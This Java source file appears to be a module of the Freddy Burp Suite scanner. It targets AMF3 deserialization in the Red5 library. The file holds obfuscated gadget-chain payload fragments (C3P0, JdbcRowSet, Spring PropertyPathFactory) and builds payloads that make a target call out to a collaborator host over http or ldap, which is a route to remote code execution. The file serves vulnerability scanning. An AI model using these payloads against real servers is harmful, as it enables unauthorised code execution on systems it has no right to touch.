package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the AMF 3 format support of the Java
 * Red5 library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class Red5AMF3Module extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private static final int C3P0WRAP_PAYLOAD_CMD_OFFSET = 1153;
    private final String C3P0WRAP_PREFIX_B64 = decrypt("");
    private final String C3P0WRAP_SUFFIX_B64 = decrypt("1CnJChbsPdDjfrLdUKMHlxkk33Q/u8fJcTATux0f39o=");
    //JdbcRowSet payload data
    private static final int JDBC_PAYLOAD_CMD_OFFSET = 100;
    private final String JDBC_PREFIX_B64 = decrypt("niG78Ns+/ofHyu4R2T+S+G91fmZ8KXeCbN+Iz4XBtvB4XBneZn6Hw3awNh2SlTZlnF45ZtzABGN23IKc+KspgiHtNCgJfxA2O4DqIMV60MVz5/zR5yBDf9xh6ce/wDrA6pVe2C9vE1IWWnMMnj8m3YrviYgiNa2wrj+nZchPtU+HKLfY93LDUB8y6ofrBe2A");
    private final String JDBC_SUFFIX_B64 = decrypt("/ChBTCLkEpnqOfb81laUj9HnHODQjSwguiqK2R59CF5CqE6/xseLqLmdPEcdXpoo");
    //SpringPropertyPathFactory payload data
    private static final int SPPF_PAYLOAD_CMD_OFFSET = 19486;
    private final String SPPF_PREFIX_B64 = decrypt("");
    private final String SPPF_SUFFIX_B64 = decrypt("");
    private byte[] C3P0WRAP_PAYLOAD;
    private byte[] JDBC_PAYLOAD;
    private byte[] SPPF_PAYLOAD;

    protected void initialiseModule() {
        setName("Red5-AMF3");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        C3P0WRAP_PAYLOAD = buildBinaryPayloadBuffer(C3P0WRAP_PREFIX_B64, C3P0WRAP_SUFFIX_B64, true); //Note, this payload isn't actually unicode but is encoded as hex-ascii so requires two bytes space per byte of payload
        JDBC_PAYLOAD = buildBinaryPayloadBuffer(JDBC_PREFIX_B64, JDBC_SUFFIX_B64, false);
        SPPF_PAYLOAD = buildBinaryPayloadBuffer(SPPF_PREFIX_B64, SPPF_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("org\\.red5\\.io\\.amf3")}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload(new byte[]{0x0d}, "java.nio.BufferUnderflowException");

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, true);
        registerActiveScanCollaboratorPayload(PN_JDBC, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return generateBinaryPayloadWithAscHexCommand(C3P0WRAP_PAYLOAD, C3P0WRAP_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/");

            case PN_JDBC:
                return generateBinaryPayload(JDBC_PAYLOAD, JDBC_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGPPF:
                return generateBinaryPayload(SPPF_PAYLOAD, SPPF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
        }
        return null;
    }
}
